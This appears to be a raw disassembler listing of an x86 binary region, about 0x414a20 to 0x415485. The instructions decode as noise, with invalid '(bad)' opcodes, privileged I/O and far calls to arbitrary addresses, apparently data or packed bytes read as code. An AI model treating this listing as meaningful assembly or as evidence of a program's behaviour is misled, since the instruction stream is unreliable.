  414a20:	out    dx,eax
  414a21:	loopne 0x4149b1
  414a23:	push   cs
  414a24:	frstor [esi-0x4f44e0bf]
  414a2a:	hlt    
  414a2b:	mov    ds:0x126da05c,eax
  414a30:	aam    0x4c
  414a32:	js     0x4149cf
  414a34:	dec    ebp
  414a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a36:	dec    esp
  414a37:	mov    bl,BYTE PTR [edx-0x39]
  414a3a:	dec    ecx
  414a3b:	dec    ebp
  414a3c:	mov    ss,WORD PTR [eax]
  414a3e:	xchg   edi,eax
  414a3f:	inc    edx
  414a40:	inc    edx
  414a41:	fmul   DWORD PTR [eax+eiz*1-0x26f59398]
  414a48:	jg     0x414a99
  414a4a:	cdq    
  414a4b:	nop
  414a4c:	inc    edi
  414a4d:	popa   
  414a4e:	jae    0x414aa7
  414a50:	sbb    dl,BYTE PTR [esi+0x5e]
  414a53:	add    ah,BYTE PTR [ecx+0x72]
  414a56:	mov    ch,0xd
  414a58:	cmp    ebp,ebp
  414a5a:	add    BYTE PTR [edx],0xe6
  414a5d:	pop    ebx
  414a5e:	inc    esi
  414a5f:	sub    dh,BYTE PTR [esp+edx*2]
  414a62:	call   0x300c:0x8f24a7e0
  414a69:	mov    al,ds:0x25d22e73
  414a6e:	aad    0x1f
  414a70:	and    al,0xb5
  414a72:	jb     0x414a61
  414a74:	jbe    0x414aa8
  414a76:	(bad)
  414a79:	les    ebx,FWORD PTR [ecx]
  414a7b:	clc    
  414a7c:	add    al,0x80
  414a7e:	lds    edi,FWORD PTR [edi+0x5f]
  414a81:	call   ecx
  414a83:	std    
  414a84:	fimul  WORD PTR [ebx-0x1a611747]
  414a8a:	mov    cl,0x3f
  414a8d:	fst    QWORD PTR [ebx]
  414a8f:	jge    0x414a67
  414a91:	ins    BYTE PTR es:[edi],dx
  414a92:	ins    BYTE PTR es:[edi],dx
  414a93:	jmp    0x414af8
  414a95:	cmp    eax,0xea50947e
  414a9a:	sbb    al,0x4c
  414a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a9d:	and    dl,bl
  414a9f:	xlat   BYTE PTR ds:[ebx]
  414aa0:	xor    ah,al
  414aa2:	pop    ebp
  414aa3:	sar    esp,1
  414aa5:	jo     0x414add
  414aa7:	inc    ecx
  414aa8:	push   ss
  414aa9:	out    0xd8,al
  414aab:	sub    esi,DWORD PTR [eax-0x50]
  414aae:	repnz xor DWORD PTR [ebx],esi
  414ab1:	jmp    0xe85d628b
  414ab6:	call   0x6e4e:0x4c67de68
  414abd:	cmp    esp,DWORD PTR [esi-0x5b]
  414ac0:	mov    ecx,cr6
  414ac3:	sbb    al,0xd6
  414ac5:	lahf   
  414ac6:	stc    
  414ac7:	cmp    al,0x7
  414ac9:	cmp    al,0x9
  414acb:	retf   0xe4a1
  414ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414acf:	jae    0x414b1a
  414ad1:	mov    es,ebp
  414ad3:	xchg   ebx,eax
  414ad4:	dec    ecx
  414ad5:	add    DWORD PTR ds:0x5fc3c2e8,ebx
  414adb:	ss mov bl,0xf
  414ade:	pop    esi
  414adf:	xlat   BYTE PTR ds:[ebx]
  414ae0:	outs   dx,DWORD PTR ds:[esi]
  414ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae2:	xor    eax,0x342dcf60
  414ae7:	dec    eax
  414ae8:	push   edx
  414ae9:	fisttp DWORD PTR [edx+0x7]
  414aec:	sbb    DWORD PTR [eax],eax
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx-0x230f9c27]
  414b64:	push   ebp
  414b65:	jg     0x414bc6
  414b67:	fild   WORD PTR [eax]
  414b69:	add    bh,bh
  414b6b:	add    BYTE PTR [eax],al
  414b6d:	add    BYTE PTR [edx+eiz*4+0x5b15aefb],dl
  414b74:	xchg   ecx,eax
  414b75:	sbb    al,0xee
  414b77:	mov    ds:0xbae44b83,eax
  414b7c:	js     0x414b9b
  414b7e:	out    0x97,al
  414b80:	and    eax,0x5bb145fc
  414b85:	mov    al,ds:0x5fa16f10
  414b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b8b:	fdiv   st,st(0)
  414b8d:	xchg   edi,eax
  414b8e:	fisubr DWORD PTR [ecx]
  414b90:	pushf  
  414b91:	out    dx,eax
  414b92:	adc    BYTE PTR [ebx],bh
  414b94:	and    eax,0xcc0ff597
  414b99:	push   0x768b8d72
  414b9e:	stc    
  414b9f:	and    ebp,esi
  414ba1:	adc    BYTE PTR [ecx+0x1],al
  414ba4:	sbb    eax,0x29fd6fce
  414ba9:	std    
  414baa:	jle    0x414bbb
  414bac:	loopne 0x414c17
  414bae:	cmp    BYTE PTR [ebp-0x71bc2f33],ah
  414bb4:	or     DWORD PTR [eax],edi
  414bb6:	sbb    ch,bl
  414bb8:	mov    ebp,eax
  414bba:	jbe    0x414bfb
  414bbc:	in     eax,0x33
  414bbe:	test   al,0x8a
  414bc0:	sbb    al,0xb9
  414bc2:	scas   eax,DWORD PTR es:[edi]
  414bc3:	add    cl,BYTE PTR [edx-0x1b]
  414bc6:	wbinvd 
  414bc8:	cmp    esi,ebx
  414bca:	enter  0x84db,0xad
  414bce:	push   ebx
  414bcf:	cld    
  414bd0:	test   ah,al
  414bd2:	outs   dx,BYTE PTR ds:[esi]
  414bd3:	scas   al,BYTE PTR es:[edi]
  414bd4:	fiadd  WORD PTR [ebp+0x3b]
  414bd7:	bound  esi,QWORD PTR [ecx]
  414bd9:	or     edx,DWORD PTR ds:0x23d47e84
  414bdf:	shl    BYTE PTR [ebx+0x53],1
  414be2:	mov    ch,0x51
  414be4:	mov    ah,0x92
  414be6:	test   BYTE PTR [ebx-0x248cc465],ch
  414bec:	es (bad) 
  414bef:	or     eax,DWORD PTR [esi-0x5a]
  414bf2:	jge    0x414beb
  414bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf5:	xor    BYTE PTR [edi-0x1a],cl
  414bf8:	daa    
  414bf9:	mov    edx,0x724ad2f8
  414bfe:	sti    
  414bff:	jge    0x414c7e
  414c01:	ja     0x414bf8
  414c03:	lods   eax,DWORD PTR ds:[esi]
  414c04:	mov    bl,0x37
  414c06:	push   ds
  414c07:	sbb    ah,bh
  414c09:	fs nop
  414c0b:	inc    esi
  414c0c:	leave  
  414c0d:	pop    ecx
  414c0e:	or     BYTE PTR [ebx],bh
  414c10:	(bad)  
  414c11:	std    
  414c12:	arpl   dx,bx
  414c14:	sbb    BYTE PTR [edx+0xc27add2],al
  414c1a:	mov    esi,0x6ae3e5b3
  414c1f:	mov    esp,0x65257361
  414c24:	push   edx
  414c25:	dec    esp
  414c26:	add    eax,0x5bc9f9de
  414c2b:	push   eax
  414c2c:	or     edi,eax
  414c2e:	push   ebx
  414c2f:	inc    esi
  414c30:	adc    edx,DWORD PTR [ecx]
  414c32:	retf   
  414c33:	add    BYTE PTR [esi+0x36dda85d],ah
  414c39:	out    0x24,al
  414c3b:	mov    bh,0x65
  414c3d:	cwde   
  414c3e:	push   cs
  414c3f:	lds    edx,FWORD PTR [esi-0x7f]
  414c42:	popf   
  414c43:	aaa    
  414c44:	adc    BYTE PTR [edi+0x27],dl
  414c47:	imul   edx,ecx,0x3e6379dc
  414c4d:	arpl   cx,bx
  414c4f:	xchg   ecx,eax
  414c50:	adc    eax,DWORD PTR [ecx+0x43]
  414c53:	popf   
  414c54:	enter  0x8056,0x47
  414c58:	shl    DWORD PTR [ecx],cl
  414c5a:	fst    DWORD PTR ds:0x12caafba
  414c60:	dec    ecx
  414c61:	pusha  
  414c62:	adc    bl,BYTE PTR [ebp-0x7fcfceae]
  414c68:	sub    ch,bl
  414c6a:	and    DWORD PTR [edx-0x6a],edx
	...
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    eax,DWORD PTR cs:[ebp+0x5e6c6050]
  414ce7:	loopne 0x414ce9
  414ce9:	add    bh,bh
  414ceb:	add    BYTE PTR [eax],al
  414ced:	add    BYTE PTR [ecx-0x6fa6506b],ah
  414cf3:	jle    0x414ccc
  414cf5:	out    dx,al
  414cf6:	ja     0x414d2f
  414cf8:	pushf  
  414cf9:	inc    ebx
  414cfa:	sbb    edx,DWORD PTR [edi]
  414cfc:	inc    esi
  414cfd:	out    0xf3,eax
  414cff:	and    ah,BYTE PTR [edx]
  414d01:	sbb    al,0xca
  414d03:	lahf   
  414d04:	test   DWORD PTR [eax+0x153f4d80],0xd5b4f9d5
  414d0e:	mov    al,0x92
  414d10:	dec    esi
  414d11:	pop    di
  414d13:	jmp    0x8575797d
  414d18:	retf   0x38d
  414d1b:	pop    ebp
  414d1c:	mov    bh,0xdc
  414d1e:	xchg   ebp,eax
  414d1f:	xchg   esi,eax
  414d20:	xor    al,0x8b
  414d22:	adc    al,0x78
  414d24:	pop    ebp
  414d25:	es daa 
  414d27:	add    DWORD PTR [esi+0x4c],esp
  414d2a:	stos   DWORD PTR es:[edi],eax
  414d2b:	ins    BYTE PTR es:[edi],dx
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	imul   esp,DWORD PTR [ebp-0x56b21cb4],0xaa63bc05
  414d37:	icebp  
  414d38:	into   
  414d39:	icebp  
  414d3a:	jg     0x414d7c
  414d3c:	xchg   esi,eax
  414d3d:	std    
  414d3e:	out    dx,eax
  414d3f:	pop    ebx
  414d40:	mov    ds:0x606f785a,al
  414d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d46:	add    cl,BYTE PTR [ebx-0xe234c74]
  414d4c:	stc    
  414d4d:	stc    
  414d4e:	aaa    
  414d4f:	fadd   st(2),st
  414d51:	in     eax,0x0
  414d53:	sub    ch,bh
  414d55:	and    DWORD PTR [eax+0x10],edx
  414d58:	(bad)  
  414d59:	iret   
  414d5a:	out    0xe6,al
  414d5c:	mov    eax,0xe267c5e3
  414d61:	aad    0x43
  414d63:	cmp    al,BYTE PTR [ebx+0x249db263]
  414d69:	ds jne 0x414d3c
  414d6c:	mov    DWORD PTR [edi+edx*4-0xb],ebp
  414d70:	or     al,0xfd
  414d72:	adc    al,0xeb
  414d74:	dec    ebx
  414d75:	cmc    
  414d76:	jmp    DWORD PTR [ecx]
  414d78:	hlt    
  414d79:	xchg   edi,eax
  414d7a:	jecxz  0x414dc9
  414d7c:	cmc    
  414d7d:	sbb    ch,ch
  414d7f:	(bad)  
  414d80:	pushf  
  414d81:	rcr    esp,1
  414d83:	(bad)  
  414d85:	cld    
  414d86:	mov    bl,0x5c
  414d88:	ins    DWORD PTR es:[edi],dx
  414d89:	jbe    0x414da3
  414d8b:	xchg   ebx,eax
  414d8c:	mov    ebp,0x46e07814
  414d91:	fs jno 0x414d86
  414d94:	call   0xac90:0xae63a519
  414d9b:	addr16 and dh,ah
  414d9e:	jle    0x414d40
  414da0:	or     BYTE PTR [ebx-0x2a],ch
  414da3:	mov    esp,0xa83ad32d
  414da8:	cmp    BYTE PTR [ebx],0x26
  414dab:	out    0x59,eax
  414dad:	or     edx,eax
  414daf:	aad    0xd6
  414db1:	loope  0x414d5e
  414db3:	xor    DWORD PTR [edx],eax
  414db5:	scas   eax,DWORD PTR es:[edi]
  414db6:	outs   dx,BYTE PTR ds:[esi]
  414db7:	fs cs stos DWORD PTR es:[edi],eax
  414dba:	pop    eax
  414dbb:	out    0xd4,al
  414dbd:	jp     0x414d7f
  414dbf:	out    0xf6,al
  414dc1:	ret    0x8147
  414dc4:	adc    eax,0xf37560cc
  414dc9:	mov    esp,0xc7108ec3
  414dce:	sbb    al,0xb6
  414dd0:	sti    
  414dd1:	xor    al,0x2e
  414dd3:	sbb    esp,ecx
  414dd5:	fsubr  QWORD PTR [esp+edx*4-0x3c221612]
  414ddc:	sub    ecx,DWORD PTR [ecx+0x66]
  414ddf:	mov    eax,ss:0x3e3498d7
  414de5:	hlt    
  414de6:	shl    BYTE PTR [esi],0x84
  414de9:	outs   dx,BYTE PTR ds:[esi]
  414dea:	xor    BYTE PTR [edi+0x1d],al
	...
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x9c4066c5
  414e66:	pop    ebp
  414e67:	loope  0x414e69
  414e69:	add    bh,bh
  414e6b:	add    BYTE PTR [eax],al
  414e6d:	add    BYTE PTR [edx],ch
  414e6f:	adc    al,BYTE PTR [ebx-0x1e]
  414e72:	in     al,dx
  414e73:	imul   esp,DWORD PTR [ebx+0x53772dc2],0xf79b8b52
  414e7d:	jg     0x414ed9
  414e7f:	arpl   WORD PTR [eax-0x63],sp
  414e82:	xchg   ebp,eax
  414e83:	jae    0x414e21
  414e85:	pop    ds
  414e86:	lea    esi,[eax-0xe3498e8]
  414e8c:	aad    0xbf
  414e8e:	sub    ecx,DWORD PTR [ebx+0x2aeed01]
  414e94:	mov    esp,0xdd0f83d
  414e99:	and    al,0xfb
  414e9b:	adc    edi,DWORD PTR es:[edx+0x6e]
  414e9f:	scas   al,BYTE PTR es:[edi]
  414ea0:	push   ds
  414ea1:	cwde   
  414ea2:	fwait
  414ea3:	mov    bh,0xb
  414ea5:	push   es
  414ea6:	cld    
  414ea7:	mov    al,0xec
  414ea9:	push   esi
  414eaa:	sar    DWORD PTR [esi-0x73],0xb7
  414eae:	xchg   DWORD PTR es:0xec3492fd,ebp
  414eb5:	loop   0x414e67
  414eb7:	sub    edi,DWORD PTR [ebx+0x65]
  414eba:	mov    ebx,gs
  414ebc:	xchg   di,ax
  414ebe:	aas    
  414ebf:	inc    ecx
  414ec0:	popf   
  414ec1:	cmp    BYTE PTR [ecx+0x49103f91],0x3c
  414ec8:	mov    edx,0xcb8ec60d
  414ecd:	mov    bh,0xc7
  414ecf:	out    dx,al
  414ed0:	sub    eax,0x97b6b501
  414ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed6:	add    edx,DWORD PTR [edx-0x7b9a8c7e]
  414edc:	or     al,0x50
  414ede:	push   es
  414edf:	mov    BYTE PTR [esi+edx*1+0x46],bh
  414ee3:	imul   BYTE PTR [ebp+0x39936298]
  414ee9:	mov    dl,0x9a
  414eeb:	fld    st(3)
  414eed:	mov    esi,0x3323620f
  414ef2:	dec    ebx
  414ef3:	mov    WORD PTR [edi+0x4d],ss
  414ef6:	jnp    0x414f48
  414ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ef9:	ins    DWORD PTR es:[edi],dx
  414efa:	push   ss
  414efb:	lds    edi,FWORD PTR [ebp-0x64777fb2]
  414f01:	out    dx,eax
  414f02:	test   BYTE PTR [ebp-0x62],0x93
  414f06:	rol    bl,0xa
  414f09:	xchg   esi,eax
  414f0a:	xchg   bp,ax
  414f0c:	xlat   BYTE PTR ds:[ebx]
  414f0d:	push   ebx
  414f0e:	jecxz  0x414f3b
  414f10:	popa   
  414f11:	fwait
  414f12:	out    0xc2,eax
  414f14:	pop    ds
  414f15:	call   0xc3e3:0xa6ccf428
  414f1c:	add    eax,0x8401c398
  414f21:	pop    ecx
  414f22:	mov    eax,ds:0x2460291c
  414f27:	dec    esp
  414f28:	das    
  414f29:	addr16 sub al,0x81
  414f2c:	in     eax,dx
  414f2d:	popf   
  414f2e:	loop   0x414f74
  414f30:	mov    edi,0xbb82b7
  414f35:	pop    eax
  414f36:	js     0x414f43
  414f38:	fdivr  QWORD PTR ds:0x4d50f623
  414f3e:	pop    es
  414f3f:	cmp    esp,ebx
  414f41:	mov    al,0xeb
  414f43:	cmp    ah,dh
  414f45:	fidivr DWORD PTR [esi]
  414f47:	adc    BYTE PTR [edi+0x156d5265],cl
  414f4d:	pusha  
  414f4e:	mov    esi,gs
  414f50:	xchg   BYTE PTR [edi],dl
  414f52:	jns    0x414f5b
  414f54:	ret    0x9e04
  414f57:	pop    eax
  414f58:	jecxz  0x414fc2
  414f5a:	push   ds
  414f5b:	push   cs
  414f5c:	sbb    DWORD PTR [edx],0x289c4d41
  414f62:	arpl   dx,bp
  414f64:	retf   
  414f65:	(bad)  
  414f66:	adc    eax,0xc418604e
  414f6b:	ficomp DWORD PTR [eax+eax*1+0x0]
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe25c:0xa36b0c34
  414fe8:	add    BYTE PTR [eax],al
  414fea:	inc    DWORD PTR [eax]
  414fec:	add    BYTE PTR [eax],al
  414fee:	xor    dh,BYTE PTR [ebx-0x54d79473]
  414ff4:	sahf   
  414ff5:	sahf   
  414ff6:	xor    BYTE PTR [ebx],dh
  414ff8:	data16 mov al,ds:0xc34c185c
  414ffe:	cmp    al,BYTE PTR [edx]
  415000:	sti    
  415001:	or     esi,DWORD PTR [edi]
  415003:	sub    ebp,DWORD PTR [edx]
  415005:	lea    esi,[esi+eiz*8-0x55]
  415009:	int3   
  41500a:	in     eax,dx
  41500b:	les    esi,FWORD PTR [ebx]
  41500d:	pop    ecx
  41500e:	repnz hlt 
  415010:	pop    edx
  415011:	sbb    DWORD PTR [ecx],0xffffff98
  415014:	(bad)  
  415015:	popf   
  415016:	cmp    al,0x63
  415018:	jnp    0x415067
  41501a:	mov    al,0xd1
  41501c:	sahf   
  41501d:	arpl   bp,ax
  41501f:	adc    al,0x1a
  415021:	pop    ebp
  415022:	sub    ebp,edi
  415024:	into   
  415025:	add    eax,0x15c7b59c
  41502a:	loope  0x41502f
  41502c:	mov    al,0xce
  41502e:	adc    al,BYTE PTR [edx-0x2a]
  415031:	lods   eax,DWORD PTR ds:[esi]
  415032:	dec    esi
  415033:	scas   al,BYTE PTR es:[edi]
  415034:	loop   0x415001
  415036:	mov    al,0xb5
  415038:	imul   BYTE PTR [esi-0x44]
  41503b:	cli    
  41503c:	lahf   
  41503d:	sahf   
  41503e:	xor    edi,DWORD PTR [edx-0x64c79dd0]
  415044:	inc    eax
  415045:	outs   dx,BYTE PTR ds:[esi]
  415046:	mov    WORD PTR [ebx+0x14ca4ae3],ds
  41504c:	push   ds
  41504d:	inc    ebx
  41504e:	adc    dl,dh
  415050:	icebp  
  415051:	mov    ebp,0x8547b03e
  415056:	mov    ebp,0xa5f9e720
  41505b:	cmp    ecx,0x7d
  41505e:	inc    esi
  41505f:	retf   0x7806
  415062:	lds    ebp,FWORD PTR [eax+0x52fb75da]
  415068:	push   0xc
  41506a:	test   eax,0x3ef68945
  41506f:	gs inc esp
  415071:	ror    ch,cl
  415073:	mov    ss,WORD PTR [ecx+0x34bc6bfc]
  415079:	mov    ds:0x4457acc6,eax
  41507e:	inc    esi
  41507f:	and    edi,ebp
  415081:	dec    esp
  415082:	cdq    
  415083:	(bad)  
  415084:	je     0x415090
  415086:	mov    edx,0x2996a322
  41508b:	xor    edi,ebx
  41508d:	fcomp  QWORD PTR [edx]
  41508f:	jl     0x415052
  415091:	fs fist WORD PTR ss:0x1b4fccd8
  415099:	(bad)  
  41509a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41509c:	cmp    al,0xc3
  41509e:	out    dx,eax
  41509f:	loope  0x4150e1
  4150a1:	aam    0x54
  4150a3:	cmp    ebp,0x93c95fd4
  4150a9:	mov    bl,0x21
  4150ab:	or     cl,0xe8
  4150ae:	cmp    ecx,DWORD PTR [bp+si-0x60]
  4150b2:	mov    gs,WORD PTR [ecx-0x2eada07a]
  4150b8:	ror    BYTE PTR [ebx],1
  4150ba:	xchg   ebp,eax
  4150bb:	xlat   BYTE PTR ds:[ebx]
  4150bc:	ja     0x4150e1
  4150be:	cs jp  0x4150f7
  4150c1:	lahf   
  4150c2:	(bad)  
  4150c3:	imul   esp,edi,0x8d62c2d2
  4150c9:	xchg   edx,eax
  4150ca:	int3   
  4150cb:	cdq    
  4150cc:	int3   
  4150cd:	cdq    
  4150ce:	and    eax,DWORD PTR [ebp-0x2]
  4150d1:	dec    edi
  4150d2:	dec    edi
  4150d3:	adc    ebp,ebp
  4150d5:	jg     0x41505a
  4150d7:	xchg   ebp,eax
  4150d8:	retf   0x1714
  4150db:	push   es
  4150dc:	dec    ecx
  4150dd:	push   eax
  4150de:	cmp    al,0xac
  4150e0:	and    DWORD PTR [edx],esp
  4150e2:	lods   al,BYTE PTR ds:[esi]
  4150e3:	adc    BYTE PTR [esi],dh
  4150e5:	inc    esi
  4150e6:	loopne 0x4150e1
  4150e8:	out    0xef,eax
  4150ea:	shl    BYTE PTR [esp+esi*4+0x0],0x0
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x6c6fc2d
  415164:	imul   edi,DWORD PTR [esi+0xe35b],0xffffffff
  41516b:	add    BYTE PTR [eax],al
  41516d:	add    BYTE PTR [ebx],cl
  41516f:	jge    0x4151e7
  415171:	dec    BYTE PTR [esp+edi*2-0x1b]
  415175:	repz cld 
  415177:	in     eax,0x19
  415179:	and    DWORD PTR [esi],0x4dc18a05
  41517f:	xlat   BYTE PTR ds:[ebx]
  415180:	cmp    al,0x4e
  415182:	jle    0x415122
  415184:	test   BYTE PTR [edx-0x2b],ch
  415187:	push   eax
  415188:	jge    0x415159
  41518a:	sbb    ebp,ebx
  41518c:	adc    al,0xb9
  41518e:	stos   DWORD PTR es:[edi],eax
  41518f:	pop    edx
  415190:	mov    bl,0x48
  415192:	push   0x554bc4b0
  415197:	push   ebp
  415198:	cmp    al,0xf6
  41519a:	push   ebp
  41519b:	dec    eax
  41519c:	in     al,dx
  41519d:	mov    dh,0xd1
  41519f:	mov    dh,0xdb
  4151a1:	ret    0xfa97
  4151a4:	loopne 0x415168
  4151a6:	pop    edx
  4151a7:	sbb    dh,BYTE PTR [edi+esi*4-0x664d0e1b]
  4151ae:	sar    WORD PTR [edx],0x48
  4151b2:	out    0xa9,eax
  4151b4:	adc    ah,al
  4151b6:	fstp   TBYTE PTR [esi+0x7f275398]
  4151bc:	xchg   edx,esi
  4151be:	push   ds
  4151bf:	adc    eax,0x337a88a3
  4151c4:	add    ebx,eax
  4151c6:	cmp    al,0x42
  4151c8:	test   al,0xa9
  4151ca:	jno    0x4151cd
  4151cc:	sub    al,0x9
  4151ce:	fisub  WORD PTR [edx]
  4151d0:	and    al,0x67
  4151d2:	jl     0x4151dd
  4151d4:	lock add edx,DWORD PTR [ecx+0x47f4fed9]
  4151db:	test   BYTE PTR ds:0x69901a18,ah
  4151e1:	adc    DWORD PTR [ecx-0x17],ebp
  4151e4:	sub    al,0x55
  4151e6:	adc    bl,BYTE PTR [ebp+0x31]
  4151e9:	xchg   edx,eax
  4151ea:	xor    eax,0x9d6ed413
  4151ef:	popf   
  4151f0:	(bad)  
  4151f1:	aaa    
  4151f2:	xchg   BYTE PTR [ebx+0x15],dl
  4151f5:	push   esp
  4151f6:	xor    BYTE PTR [ebp-0x3e5a26bb],ah
  4151fc:	fdivr  QWORD PTR [eax+0x58]
  4151ff:	mov    DWORD PTR [ecx],edx
  415201:	repnz scas al,BYTE PTR es:[edi]
  415203:	div    BYTE PTR [edx+0x67]
  415206:	stos   DWORD PTR es:[edi],eax
  415207:	cwde   
  415208:	or     dh,dl
  41520a:	jmp    0x7ad02c1b
  41520f:	repz cmp DWORD PTR [edi],ebx
  415212:	in     al,dx
  415213:	lea    esp,[ebp-0x798ce73d]
  415219:	inc    ebp
  41521a:	push   cs
  41521b:	mov    ecx,0x5c2433df
  415220:	push   0x1c
  415222:	jge    0x4151d6
  415224:	scas   al,BYTE PTR es:[edi]
  415225:	hlt    
  415226:	mov    esi,0x12ebb70b
  41522b:	pop    ebx
  41522c:	xchg   esp,eax
  41522d:	jne    0x41521a
  41522f:	enter  0xff6c,0x86
  415233:	adc    ch,BYTE PTR [ecx+0x69]
  415236:	fst    DWORD PTR [esi]
  415238:	ins    BYTE PTR es:[edi],dx
  415239:	inc    eax
  41523a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41523b:	test   DWORD PTR [ecx+eiz*4+0x31],ecx
  41523f:	aam    0x43
  415241:	cld    
  415242:	scas   al,BYTE PTR es:[edi]
  415243:	mov    eax,ds:0xded9b34d
  415248:	dec    edx
  415249:	xlat   BYTE PTR ds:[ebx]
  41524a:	or     cl,BYTE PTR [edx+0x2670f449]
  415250:	test   BYTE PTR [edx+0x13340973],bh
  415256:	pop    edx
  415257:	dec    ebp
  415258:	in     al,dx
  415259:	loope  0x4151df
  41525b:	aas    
  41525c:	es inc ebx
  41525e:	xor    bl,BYTE PTR [eax-0x3c72cc39]
  415264:	adc    BYTE PTR [eax-0x47],dh
  415267:	cmp    eax,0x35c14c0f
  41526c:	xchg   edi,eax
	...
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xbc418c0b
  4152e5:	jmp    0x423744
  4152ea:	inc    DWORD PTR [eax]
  4152ec:	add    BYTE PTR [eax],al
  4152ee:	xor    dh,BYTE PTR [eax-0x72]
  4152f1:	scas   al,BYTE PTR es:[edi]
  4152f2:	jmp    0x1a994af2
  4152f7:	int3   
  4152f8:	mov    ebx,0xf8c9e217
  4152fd:	mov    ds,edi
  4152ff:	popa   
  415300:	nop
  415301:	test   eax,0xe43125c6
  415306:	mov    edx,0x98c1ffc8
  41530b:	mov    al,ds:0xdd861bec
  415310:	ffreep st(0)
  415312:	out    0x5f,eax
  415314:	and    eax,0x8ce198f7
  415319:	push   ebx
  41531a:	pop    ds
  41531b:	(bad)  
  41531c:	cmp    ch,BYTE PTR [esi]
  41531e:	inc    esp
  41531f:	aas    
  415320:	push   0x65a89313
  415325:	lods   al,BYTE PTR ds:[esi]
  415326:	icebp  
  415327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415328:	push   ds
  415329:	pop    es
  41532a:	out    0x5f,al
  41532c:	cmp    al,0xeb
  41532e:	or     al,0xda
  415330:	adc    bh,bh
  415332:	and    DWORD PTR [esi+0x65e5ed3d],eax
  415338:	xchg   ebp,eax
  415339:	fistp  DWORD PTR ds:0xa96b68f0
  41533f:	xchg   edx,eax
  415340:	test   DWORD PTR [ebx+0x3a],ecx
  415343:	mov    esi,0xa4aac95f
  415348:	xor    al,0x50
  41534a:	(bad)  
  41534b:	ins    DWORD PTR es:[edi],dx
  41534c:	push   ss
  41534d:	scas   al,BYTE PTR es:[edi]
  41534e:	sbb    BYTE PTR [eax+0x2ddf2395],cl
  415354:	mov    ebp,0x7a639b91
  415359:	sub    bl,bh
  41535b:	mov    ebx,0x1a191bf
  415360:	push   es
  415361:	push   esi
  415362:	fadd   QWORD PTR [eax-0xed5fee]
  415368:	cmp    dl,0x7e
  41536b:	arpl   WORD PTR [ecx-0x1],ax
  41536e:	aad    0x95
  415370:	jae    0x4153d5
  415372:	xchg   esp,eax
  415373:	sub    ch,cl
  415375:	dec    edi
  415376:	xchg   ecx,eax
  415377:	mov    eax,0x91cb5df0
  41537c:	rol    DWORD PTR [esi-0x4f],cl
  41537f:	mov    ecx,0x3aca1005
  415384:	loop   0x41539f
  415386:	aam    0xe
  415388:	mov    ecx,0x3e656821
  41538d:	adc    eax,0xe2a85cd3
  415392:	jle    0x415348
  415394:	or     BYTE PTR [edx+0x5c6ae361],bh
  41539a:	sti    
  41539b:	mov    ds:0x7eb52758,eax
  4153a0:	push   0xc
  4153a2:	imul   esi
  4153a4:	xchg   edx,eax
  4153a5:	pop    edi
  4153a6:	xchg   esi,eax
  4153a7:	imul   ecx,DWORD PTR [edi],0x692df294
  4153ad:	scas   al,BYTE PTR es:[edi]
  4153ae:	test   eax,0x75715259
  4153b3:	xor    dl,BYTE PTR [edx+0x37]
  4153b6:	push   0x12
  4153b8:	xor    dl,BYTE PTR [ecx-0x4d521c65]
  4153be:	ret    0x26ad
  4153c1:	cmp    edi,eax
  4153c3:	nop
  4153c4:	push   ebx
  4153c5:	idiv   DWORD PTR [eax]
  4153c7:	cmp    ebx,DWORD PTR es:[ecx+ecx*2-0x1820e260]
  4153cf:	xchg   edx,eax
  4153d0:	je     0x415447
  4153d2:	clc    
  4153d3:	push   edx
  4153d4:	call   0x29327a25
  4153d9:	div    esp
  4153db:	add    eax,0x5c1c65d3
  4153e0:	pop    ss
  4153e1:	setge  cl
  4153e4:	sub    BYTE PTR [edx+0x7a5a61fa],dh
  4153ea:	(bad)  
  4153eb:	js     0x41540e
	...
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x5cd3e5b0
  415463:	jbe    0x4153fd
  415465:	pop    ds
  415466:	pop    ecx
  415467:	in     eax,0x0
  415469:	add    bh,bh
  41546b:	add    BYTE PTR [eax],al
  41546d:	add    BYTE PTR [edx-0x49],ch
  415470:	retf   0x1abd
  415473:	xchg   esp,eax
  415474:	lahf   
  415475:	add    ebp,DWORD PTR [eax]
  415477:	cmp    esi,esp
  415479:	jl     0x4154d1
  41547b:	mov    dh,ch
  41547d:	test   al,0x6e
  41547f:	mov    eax,ds:0x7b005295
  415484:	inc    edx
  415485:	shr    BYTE PTR [esi-0xe],0xd
